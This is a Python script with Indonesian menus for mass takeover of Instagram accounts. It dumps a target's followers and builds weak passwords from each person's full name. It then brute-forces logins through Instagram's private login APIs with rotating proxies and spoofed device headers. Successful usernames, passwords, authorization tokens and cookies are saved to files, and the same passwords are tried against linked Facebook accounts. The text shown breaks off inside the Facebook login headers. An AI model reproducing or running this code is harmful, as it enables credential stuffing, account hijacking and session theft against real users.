#* bagian menu script

from Penyimpanan.Database.data import *
from Penyimpanan.banner_terminal import Terminal
from Penyimpanan.Temporary.useragent import Useragent
from Penyimpanan.Temporary.login_instagram import Login
from Penyimpanan.Database.payloads import Guirequest
from Penyimpanan.Temporary.enc_browsers import Encrypted


dump = []
class Requires:
    def __init__(self) -> None:
        pass
        
    def Username_To_Userid(self, username, cookies):
        with requests.Session() as r:
            try:
                response = r.get('https://www.instagram.com/{}/'.format(username), headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"},cookies = {'cookie': cookies}).text
                if "user_id" in str(response): return(re.findall('"user_id":"(\d+)"', str(response))[0])
            except (Exception) as e:
                Console().print('[white] ! Maaf, Gagal Mengubah Username Ke Useridz, Cari Target Lain')
                exit()
                
    def Validasi_Username(self, username):
       with requests.Session() as r:
           try:
               response = r.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(username), headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"}).json()
               return (
                   response["data"]["user"]["edge_followed_by"]["count"], 
                   response["data"]["user"]["edge_follow"]["count"],
                   response["data"]["user"]["edge_owner_to_timeline_media"]["count"]
               )
           except (Exception) as e: return(None,None,None)
           
    def Facebook_Acc(self, cookies):
        with requests.Session() as r:
            try:
                self.csrftoken = re.findall('csrftoken=(.*?);',str(cookies))
                self.headers = {"Host": "www.instagram.com","content-length": "0","x-requested-with": "XMLHttpRequest","x-csrftoken": "tJdFh5wJTuFDQZvpadl2kTm0LGRSkH8w" if len(self.csrftoken) == 0 else self.csrftoken[0],"x-ig-app-id": "936619743392459","x-instagram-ajax": "1011212827","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36","content-type": "application/x-www-form-urlencoded","accept": "*/*","x-asbd-id": "129477","cookie": cookies}
                response = r.post('https://www.instagram.com/api/v1/web/fxcal/ig_sso_users/', headers = self.headers).json()
                if 'fbAccount' in str(response):
                    self.username = response['fbAccount']['display_name']
                    self.response2 = r.get('https://accountscenter.instagram.com/profiles/', cookies = {'cookie':cookies}).text
                    self.userid= re.search('{"__typename":"XFBFXFBAccountInfo","id":"(.*?)"}', str(self.response2)).group(1)
                else:
                    self.username = (None)
                    self.userid = (None)
            except (Exception) as e:
                self.username = 'Facebook Error'
                self.userid = 'Facebook Error'
            return(self.username, self.userid)
            
class Main: 
    def __init__(self) -> None:
        self.Folder_Dir()
        self.data = ('data/user/login/')
        pass
      
    def Folder_Dir(self): 
        try:
            os.mkdir('data')
            os.mkdir('data/user')
            os.mkdir('data/user/login')
        except (Exception) as e: pass

    def Pengecekan_Data(self):
        try:
           cookies = json.loads(open(self.data+'.Cookies_IGS.json', mode='r').read())['Cookie']
           self.Menu_Instagram(cookies)          
        except (FileNotFoundError) as e:
           Terminal().clear_terminalize()
           Console().print(f"[red] ! {str(e).title()}")
           time.sleep(3.5)
           Login().Removed_Cookies()
           
    def Menu_Instagram(self, cookies):
        try:
            self.username, self.fullname = Login().Validasi_Cookies(cookies)
        except (KeyError) as e:
            Terminal().clear_terminalize()
            Console().print(f"[red] ! {str(e).title()}")
            time.sleep(3.5)
            Login().Removed_Cookies() 
                        
        except (requests.exceptions.ConnectionError) as e:
            Console().print(f"[red] ! {str(e).title()}")
            time.sleep(3.5)
            exit()
        try:
            Terminal().banner_instagram()
            Console().print('\n[white] * Halo [green]{}[white] - [green]{}[white]!'.format(self.username,self.fullname))
            Console().print('\n\
[white] 01. Dump Username Dari Pengikut\n\
[white] 02. Dump Username Dari Mengikuti\n\
[white] 03. Cek Hasil Ok Dan Cp\n\
[white] 00. Hapus Cookies\n\
            ')
            query = Console().input("[white] ?) choose: ")
            if query == '01' or query == '1':
                try:
                    Console().print('\n[white] # Masukan [green]Username[white] Akun Instagram Target Pastikan Tidak [red]Terkunci[white] Khusus Untuk Akun [blue]Centang Biru[white] Bisa Di Dump, Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya : [green]zoraa_dev,zoraa_dev2[white] Dan Gunakan [red]Ctrl + C[white] Untuk Berhenti Dump!')
                    username = Console().input("[white] ?) username: ")
                    for self.username in username.split(','):
                        uname = Requires().Username_To_Userid(self.username, cookies)
                    try: self.Dump_Pengikut(True, uname, cookies, '')
                    except (Exception) as e: pass
                    if len(dump) < 50:
                        Console().print('[white] ! Maaf, Jumlah Dump Pengikut Terlalu Sedikit, Pastikan Dump Lebih Dari 50 Username')
                        exit()
                    else: Malink().Progess_Malink()
                except (Exception) as e:
                    Console().print(f"[red] ! {str(e).title()}")
                    time.sleep(3.5)
                    exit()
                
            elif query == '02' or query == '2':
                try:
                    Console().print('\n[white] # Masukan [green]Username[white] Akun Instagram Target Pastikan Tidak [red]Terkunci[white] Khusus Untuk Akun [blue]Centang Biru[white] Bisa Di Dump, Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya : [green]zoraa_dev,zoraa_dev2[white] Dan Gunakan [red]Ctrl + C[white] Untuk Berhenti Dump!')
                    username = Console().input("[white] ?) username: ")
                    for self.username in username.split(','):
                        uname = Requires().Username_To_Userid(self.username, cookies)
                    try: self.Dump_Mengikuti(False, uname, cookies, '')
                    except (Exception) as e: pass
                    if len(dump) < 50:
                        Console().print('[white] ! Maaf, Jumlah Dump Pengikut Terlalu Sedikit, Pastikan Dump Lebih Dari 50 Username')
                        exit()
                    else: Malink().Progess_Malink()
                except (Exception) as e:
                    Console().print(f"[red] ! {str(e).title()}")
                    time.sleep(3.5)
                    exit()
                    
            elif query == '03' or query == '3':
                try:
                    Console().print('\n[white] # Masukan Nama Folders Yang Mau Di Cek Misalnya Folder OK Ketik OK Dan Folder CP sebaliknya Ketik CP ')
                    folders = Console().input("[white] ?) folders: ")
                    print()
                    try: xd = os.listdir('/sdcard/'+str(folders))
                    except (Exception) as e:
                        Console().print(f"[red] ! {str(e).title()}")
                        time.sleep(3.5)
                        exit()
                    self.aa = 0
                    for ck in xd:
                        self.aa +=1
                        Console().print(f'[white] {self.aa}) {ck}')
                    Console().print(f'\n[white] # Masukan Nama File Di Folders {folders} Contoh: {folders}-11-March-2025')
                    ceklist = Console().input(f"[white] ?) files {folders}: ")
                    self.Result(folders,ceklist)
                except (Exception) as e:
                    Console().print(f"[red] ! {str(e).title()}")
                    time.sleep(3.5)
                    exit()
                    
            elif query == '00' or query == '0':
                try: Login().Removed_Cookies() 
                except (Exception) as e:
                    Console().print(f"[red] ! {str(e).title()}")
                    time.sleep(3.5)
                    exit()
                 
            else:
                Console().print("[white] ! Maaf, Anda Tidak Memasukan Apapun, Harap Masukan ([green]Menu[white]) Di Atas")                
        except (AttributeError) as e:
            Console().print(f"[red] ! {str(e).title()}")
            time.sleep(3.5)
            exit()
            
    def Dump_Pengikut(self, type, uname, cookies, cursor):
        with requests.Session() as r:
            try:
                end_after = ('variables={"id":"%s","first":24,"after":"%s"}'%(uname,cursor))
                r.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cookies})
                params = ("query_hash=37479f2b8209594dde7facb0d904896a&{}".format(end_after))
                response = r.get(f'https://www.instagram.com/graphql/query/', params = params).json()
                for x in response['data']['user']['edge_followed_by']['edges']:
                    if x not in dump:
                        dump.append(x['node']['username']+'<=>'+x['node']['full_name'])
                        Console().print('[white] ! Dump [green]@{}[white]/[red]{} [white]Username Pengikut'.format(str(x['node']['username'])[:20],str(len(dump))), end='\r')
                end_cursor = response['data']['user']['edge_followed_by']['page_info']['has_next_page']
                if end_cursor is True:
                    cursor = response['data']['user']['edge_followed_by']['page_info']['end_cursor']
                    self.Dump_Pengikut(type, uname, cookies, cursor)
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass
            
    def Dump_Mengikuti(self, type, uname, cookies, cursor):
        with requests.Session() as r:
            try:
                end_after = ('variables={"id":"%s","first":24,"after":"%s"}'%(uname,cursor))
                r.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cookies})
                params = ("query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(end_after))
                response = r.get(f'https://www.instagram.com/graphql/query/', params = params).json()
                for x in response['data']['user']['edge_follow']['edges']:
                    if x not in dump:
                        dump.append(x['node']['username']+'<=>'+x['node']['full_name'])
                        Console().print('[white] ! Dump [green]@{}[white]/[red]{} [white]Username Mengikuti'.format(str(x['node']['username'])[:20],str(len(dump))), end='\r')
                end_cursor = response['data']['user']['edge_follow']['page_info']['has_next_page']
                if end_cursor is True:
                    cursor = response['data']['user']['edge_follow']['page_info']['end_cursor']
                    self.Dump_Mengikuti(type, uname, cookies, cursor)
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass
        
        
    def Result(self, folders, isi):
        for buka in open(f'/sdcard/'+str(folders)+'/'+str(isi)).readlines():
            try:
                tree = Tree('\r                                             ')
                tree = tree.add('╭ [green]Login Success')
                treo = tree.add(f'[white]Account_Instagram')
                treo.add(f'[white]Username: [green]{buka.split("|")[0]}')
                treo.add(f'[white]Password: [green]{buka.split("|")[1]}')
                treo.add(f'[white]Profiles: [green]{buka.split("|")[2]}/{buka.split("|")[3]}/{buka.split("|")[4]}')
                treo.add(f'[white]Autorization: [green]{buka.split("|")[5]}')
                true = tree.add(f'[white]Account_Facebook')
                true.add(f'[white]User ID: [green]{buka.split("|")[6]}')
                true.add(f'[white]Username: [green]{buka.split("|")[7]}')
                true.add(f'[white]Response: [green]{buka.split("|")[8]}')
                printz(tree)
            except Exception:
                tree = Tree('\r                                             ')
                tree = tree.add('╭ [green]Login Success')
                tree.add(f'[white]Username: [green]{buka.split("|")[0]}')
                tree.add(f'[white]Password: [green]{buka.split("|")[1]}')
                printz(tree)
                
class Malink:
    def __init__(self) -> None:
        self.looping, self.success, self.chekpoint, = 0,0,0
        self.result_ok, self.result_cp = self.Tersimpan_Result()
        pass
        
    def Kalender(self):
        struct_time = time.localtime(time.time())
        return (time.strftime('%d', struct_time),time.strftime('%B', struct_time),time.strftime('%Y', struct_time))
        
    def Tersimpan_Result(self):
        tanggal, bulan, tahun = self.Kalender()
        self.ok = 'OK-{}-{}-{}'.format(tanggal,bulan,tahun)
        self.cp = 'CP-{}-{}-{}'.format(tanggal,bulan,tahun)
        return(self.ok,self.cp)
        
    def Progess_Malink(self):
        try:
            Console().print('\n\n\
[white] 01. Login Dari Api Threads [[green]Very Recommended[white]]\n\
[white] 02. Login Dari Api App Instagram [[green]Recommended[white]]\n\
            ')
            query = Console().input("[white] ?) choose: ")
            self.Exec_Malink(query)
        except (Exception) as e:
            Console().print(f"[red] ! {str(e).title()}")
            exit()
            
    def Pw_Malink(self, username):
        self.password = []
        for nama in username.split(' '):
            if len(nama) < 3:
                continue
            else:
                for passwords in [f'{nama}123',f'{nama}1234',f'{nama}12345',f'{nama}123456']:
                    if len(passwords) < 6 or str(passwords).isalnum() == False or len(username.split(' ')) > 5:
                        continue
                    else:
                        self.password.append(f'{str(passwords).lower()}')
        for passwords in [f'{username}', f'{username.replace(" ", "")}']:
            if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
                continue
            else:
                self.password.append(f'{str(passwords).lower()}')
        return (self.password)
            
    def Exec_Malink(self, query):
        self.tambahan = []
        Console().print('\n[white] # Apakah Anda Ingin Menambahkan Pw Manual?, Apabila Ingin Menambahkan Pw Manual Ketik [green]Y[white] Dan Sebaliknya Ketik [red]T[white]')
        requery = Console().input("[white] ?) Ketik ([green]Y[white]/[red]T[white]): ")
        if requery =='Y' or requery =='y':
            Console().print('\n[white] # Masukan Pw Manual, Misalnya : [green]kamu nanya,gemarang[white] Tanpa Spasi Dan Banyaknya Pw Gunakan Pemisah Koma[white]')
            s = Console().input("[white] ?) Ketik ([green]Pw Tambahan[white]): ")
            for ps in s.split(','):
                self.tambahan.append(ps)
        Console().print(f'\n[white] * Result Ok Save As Internal: [green]{self.result_ok}\n[white] * Result Cp Save As Internal: [red]{self.result_cp}\n\n[white] # Mode Pesawat Setiap [blue]250[white] Loop Agar Tidak Terjadi [red]Spam[white] IP\n')
        with ThreadPoolExecutor(max_workers=30) as V:
            for Uname_Funame in dump:
                username, fullname = Uname_Funame.split('<=>')
                if requery =='Y' or requery =='y':
                    passwords = self.Pw_Malink(fullname) + self.tambahan
                else: passwords = self.Pw_Malink(fullname)
                if query ==('01') or query == ('1'): V.submit(self.Exec_Private_Api_Threads, username, passwords)
                elif query ==('02') or query == ('2'): V.submit(self.Exec_Private_Api_Apps, username, passwords)
                else: V.submit(self.Exec_Private_Api_Threads, username, passwords)
        Console().print(f'\n\n[white]# Selamat Kamu Telah Mendapatkan [green]{self.success}[white] Hasil [green]Success[white] Dan [yellow]{self.chekpoint}[white] Hasil [yellow]Checkpoint[white] Dari [blue]{len(dump)}[white] Username, Semua Hasil Tersimpan Di Folder Result!')
        exit()
                                
    def Exec_Private_Api_Threads(self, username, passwords):
        byps = requests.Session()
        Console().print(f"[white] * looping: {'{:.0%}'.format(self.looping/float(len(dump)))}/{str(len(dump))}/{self.looping} success: [green]{self.success}[white] checkpoint: [red]{self.chekpoint}[white]", end='\r')  
        for password in passwords:
            try:
                byps.headers.update({**Guirequest().HeadersApiLogin(),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,999)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(2000,5000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(500,4000)),
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-android-id': 'android-%s' % hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
                    'x-ig-timezone-offset': str(Guirequest().timezone_offset()),
                    'user-agent': Useragent().Useragent_Block_Ig()
                })
                paswd = Encrypted().enc_browsers(password)
                #paswd  = '#PWD_INSTAGRAM:0:%s:%s'%(int(time.time()), password)
                encode = (f'params=%7B%22client_input_params%22%3A%7B%22password%22%3A%22{urllib.parse.quote_plus(paswd)}%22%2C%22contact_point%22%3A%22{str(username)}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22event_flow%22%3A%22login_manual%22%2C%22openid_tokens%22%3A%7B%7D%2C%22machine_id%22%3A%22%22%2C%22family_device_id%22%3A%22{byps.headers["x-ig-family-device-id"]}%22%2C%22accounts_list%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22has_whatsapp_installed%22%3A0%2C%22login_attempt_count%22%3A1%2C%22device_id%22%3A%22{byps.headers["x-ig-android-id"]}%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22auth_secure_device_id%22%3A%22%22%2C%22encrypted_msisdn%22%3A%22%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22device_emails%22%3A%5B%5D%2C%22lois_settings%22%3A%7B%22lara_override%22%3A%22%22%2C%22lois_token%22%3A%22%22%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22event_step%22%3A%22home_page%22%2C%22secure_family_device_id%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22is_caa_perf_enabled%22%3A0%2C%22is_platform_login%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_in_switcher%22%3A0%2C%22family_device_id%22%3A%22{byps.headers["x-ig-family-device-id"]}%22%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22credential_type%22%3A%22password%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22username_text_input_id%22%3A%22u7x8ax%3A58%22%2C%22password_text_input_id%22%3A%22u7x8ax%3A59%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A182729300100110%2C%22device_id%22%3A%22{byps.headers["x-ig-android-id"]}%22%2C%22server_login_source%22%3A%22login%22%2C%22login_source%22%3A%22Login%22%2C%22caller%22%3A%22gslr%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%22{str(byps.headers["x-bloks-version-id"])}%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id={str(byps.headers["x-bloks-version-id"])}')                
                byps.headers.update({'content-length': str(len(encode))})
                try: proxy = {'http': 'socks4://'+str(random.choice(open("Penyimpanan/Database/proxyKu.txt","r").read().splitlines()))}
                except (Exception) as e: proxy = {'http': 'socks4://207.188.134.194:8118'}
                response = byps.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = encode, proxies = proxy, allow_redirects=True).text
                if 'Bearer IGT:2:' in str(response.replace('\\', '')) and '"pk_id":' in str(response.replace('\\', '')):
                    self.success+=1
                    self.ig_set_autorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.replace('\\', ''))).group(1)
                    self.decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(self.ig_set_autorization.split('Bearer IGT:2:')[1]))
                    try: self.ig_set_cookies = (';'.join(['%s=%s'%(name, value) for name, value in self.decode_ig_set_authorization.items()]))
                    except (Exception) as e: self.ig_set_cookies = ('Cookies Error Not Found 404')
                    try: follower, followed, feedpost = Requires().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    try:
                        self.userid, self.username = Requires().Facebook_Acc(self.ig_set_cookies)
                        self.acc_facebook, self.UseragentFB = AccesFacebook().Username_And_Password(self.username,password)
                    except (Exception, UnboundLocalError) as e: self.acc_facebook = ('Response Error 404')
                    tree = Tree('\r                                             ')
                    tree = tree.add('╭ [green]Login Success')
                    treo = tree.add(f'[white]Account_Instagram')
                    treo.add(f'[white]Username: [green]{username}')
                    treo.add(f'[white]Password: [green]{password}')
                    treo.add(f'[white]Profiles: [green]{follower}/{followed}/{feedpost}')
                    treo.add(f'[white]Autorization: [green]{self.ig_set_autorization}; {self.ig_set_cookies}')
                    true = tree.add(f'[white]Account_Facebook')
                    true.add(f'[white]User ID: [green]{self.username}')
                    true.add(f'[white]Username: [green]{self.userid}')
                    true.add(f'[white]Response: [green]{self.acc_facebook}')
                    treu = tree.add(f'[white]Generate Useragent')
                    treu.add(f'[white]FB: [green]{self.UseragentFB}')
                    treu.add(f'[white]IG: [green]{byps.headers["user-agent"]}')
                    printz(tree)
                    save = (f'{username}|{password}|{follower}|{followed}|{feedpost}|{self.username}|{self.userid}|acc facebook: {self.acc_facebook}|{self.ig_set_autorization}; {self.ig_set_cookies}\n')
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                       wr.write(save)
                       wr.close()
                    break 
                elif 'challenge_required' in str(response.replace('\\','')):
                    try: follower, followed, feedpost = Requires().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r                                             ')
                    tree = tree.add('╭ [red]Login Checkpoint')
                    tree.add(f'[white]Username: [red]{username}')
                    tree.add(f'[white]Password: [red]{password}')
                    tree.add(f'[white]Profiles: [red]{follower}/{followed}/{feedpost}')
                    tree.add(f'[white]Useragent: [red]{byps.headers["user-agent"]}')
                    printz(tree)
                    save = (f'{username}|{password}|{follower}|{followed}|{feedpost}\n')
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                       wr.write(save)
                       wr.close()
                    self.chekpoint+=1
                    break    
                else: continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects): time.sleep(3.5)         
        self.looping+=1
        
    def Exec_Private_Api_Apps(self, username, passwords):
        byps = requests.Session()
        Console().print(f"[white] * looping: {'{:.0%}'.format(self.looping/float(len(dump)))}/{str(len(dump))}/{self.looping} success: [green]{self.success}[white] checkpoint: [red]{self.chekpoint}[white]", end='\r')  
        for password in passwords:
            try:
                byps.headers.update({**Guirequest().HeadersApiLogin(),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,999)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(2000,5000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(500,4000)),
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-android-id': 'android-%s' % hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
                    'x-ig-timezone-offset': str(Guirequest().timezone_offset()),
                    'user-agent': Useragent().Useragent_Block_Ig()
                })
                paswd = Encrypted().enc_browsers(password)
                #paswd  = '#PWD_INSTAGRAM:0:%s:%s'%(int(time.time()), password)
                payload = {'params': '{"client_input_params":{"device_id":"'+ str(byps.headers['x-ig-android-id']) +'","lois_settings":{"lois_token":"","lara_override":""},"name":"'+str(username)+'","machine_id":"'+str(byps.headers['x-mid'])+'","profile_pic_url":null,"contact_point":"'+str(username)+'","encrypted_password":"'+paswd+'"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"'+str(byps.headers['x-ig-family-device-id'])+'","device_id":"'+str(byps.headers['x-ig-device-id'])+'","offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":"'+str(uuid.uuid4())+'","login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}', 'bk_client_context': '{"bloks_version":"'+ str(byps.headers['x-bloks-version-id']) +'","styles_id":"instagram"}','bloks_versioning_id': str(byps.headers['x-bloks-version-id'])}
                encode = ('params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(payload['params']), urllib.parse.quote(payload['bk_client_context']), payload['bloks_versioning_id'])+'&ig_sig_key_version=4')
                byps.headers.update({'content-length': str(len(encode))})
                try: proxy = {'http': 'socks4://'+str(random.choice(open("Penyimpanan/Database/proxyKu.txt","r").read().splitlines()))}
                except (Exception) as e: proxy = {'http': 'socks4://207.188.134.194:8118'}
                response = byps.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/', data = encode, proxies = proxy, allow_redirects=True).text
                if 'Bearer IGT:2:' in str(response.replace('\\', '')) and '"pk_id":' in str(response.replace('\\', '')):
                    self.success+=1
                    self.ig_set_autorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.replace('\\', ''))).group(1)
                    self.decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(self.ig_set_autorization.split('Bearer IGT:2:')[1]))
                    try: self.ig_set_cookies = (';'.join(['%s=%s'%(name, value) for name, value in self.decode_ig_set_authorization.items()]))
                    except (Exception) as e: self.ig_set_cookies = ('Cookies Error Not Found 404')
                    try: follower, followed, feedpost = Requires().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    try:
                        self.userid, self.username = Requires().Facebook_Acc(self.ig_set_cookies)
                        self.acc_facebook, self.UseragentFB = AccesFacebook().Username_And_Password(self.username,password)
                    except (Exception, UnboundLocalError) as e: self.acc_facebook = ('Response Error 404')
                    tree = Tree('\r                                             ')
                    tree = tree.add('╭ [green]Login Success')
                    treo = tree.add(f'[white]Account_Instagram')
                    treo.add(f'[white]Username: [green]{username}')
                    treo.add(f'[white]Password: [green]{password}')
                    treo.add(f'[white]Profiles: [green]{follower}/{followed}/{feedpost}')
                    treo.add(f'[white]Autorization: [green]{self.ig_set_autorization}; {self.ig_set_cookies}')
                    true = tree.add(f'[white]Account_Facebook')
                    true.add(f'[white]User ID: [green]{self.username}')
                    true.add(f'[white]Username: [green]{self.userid}')
                    true.add(f'[white]Response: [green]{self.acc_facebook}')
                    treu = tree.add(f'[white]Generate Useragent')
                    treu.add(f'[white]FB: [green]{self.UseragentFB}')
                    treu.add(f'[white]IG: [green]{byps.headers["user-agent"]}')
                    printz(tree)
                    save = (f'{username}|{password}|{follower}|{followed}|{feedpost}|{self.username}|{self.userid}|acc facebook: {self.acc_facebook}|{self.ig_set_autorization}; {self.ig_set_cookies}\n')
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                       wr.write(save)
                       wr.close()
                    break 
                elif 'challenge_required' in str(response.replace('\\','')):
                    try: follower, followed, feedpost = Requires().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r                                             ')
                    tree = tree.add('╭ [red]Login Checkpoint')
                    tree.add(f'[white]Username: [red]{username}')
                    tree.add(f'[white]Password: [red]{password}')
                    tree.add(f'[white]Profiles: [red]{follower}/{followed}/{feedpost}')
                    tree.add(f'[white]Useragent: [red]{byps.headers["user-agent"]}')
                    printz(tree)
                    save = (f'{username}|{password}|{follower}|{followed}|{feedpost}\n')
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                       wr.write(save)
                       wr.close()
                    self.chekpoint+=1
                    break    
                else: continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects): time.sleep(3.5)         
        self.looping+=1

class AccesFacebook:
    def __init__(self) -> None:
        pass
        
    def Username_And_Password(self, username, password):
        byps = requests.Session()
        ua_generate = (f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{random.randrange(100,124)}.0.{random.randrange(5111,6999)}.{random.randrange(60, 299)} Mobile Safari/537.36')
        try:
            response = byps.get('https://mbasic.prod.facebook.com/login.php?skip_api_login=1&api_key=1312975155509988&kid_directed_site=0&app_id=1312975155509988&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D1312975155509988%26redirect_uri%3Dhttps%253A%252F%252Fwww.matahari.com%252Fthor_integration_social_login%252Fsocial%252Flogin%252F%26scope%3Demail%252C%2Bpublic_profile%26state%3DHA-XI8RHTS4ODGKVEBPQFU306M97A1L2CJNZY5W%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D153726aa-50ce-4e3b-8138-929f6098e9dc%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.matahari.com%2Fthor_integration_social_login%2Fsocial%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-XI8RHTS4ODGKVEBPQFU306M97A1L2CJNZY5W%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr').text
            payload = {'lsd': re.search('name="lsd" value="(.*?)"',str(response)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(response)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0'}
            headersPost = {
                'Host': 'mbasic.prod.facebook.com',
                'origin': 'https://free.facebook.com/',
                'referer': 'https://free.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified',
                'accept-language': 'en-US,id-ID,id;q=0.9',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-ch-ua-mobile': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'cache-control': 'max-age=0',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': ua_generate,
                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="{}.0.0.0", "Windows Edge";v="{}", "Cromium";v="{}"'.format(str(random.randint(8,24)), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua_generate)).group(1), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua_generate)).group(1)),
                'accept-encoding': 'gzip, deflate',
                'content-type': 'application/x-www-form-urlencoded',
                'content-length': str(len(("&").join([ "%s=%s" % (name, value) for name, value in payload.items() ]))),
